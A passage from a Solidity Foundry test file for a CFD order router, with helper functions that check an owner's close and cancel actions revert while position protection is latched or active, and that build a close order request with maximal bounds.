        if (cycle % 60 == 0) return true; // every ~60 s
        // Additional deterministic pseudo-random samples (~1/20 of cycles).
        return uint256(keccak256(abi.encode(uint256(0xA11CE), cycle))) % 20 == 0;
    }

    function _assertOwnerExitsBlocked(uint64 pid) internal {
        OrderV3Types.OrderRequest memory req = _closeRequest();
        vm.startPrank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(pid, _unlimited());
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(pid);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(pid, req);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(req);
        vm.stopPrank();
    }

    function _closeRequest() internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = bytes32(uint256(1));
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = POSITION_SIZE;
        request.targetPrice = 1;
        request.isClose = true;
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + window),
            executionWindowSeconds: window,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

}
```
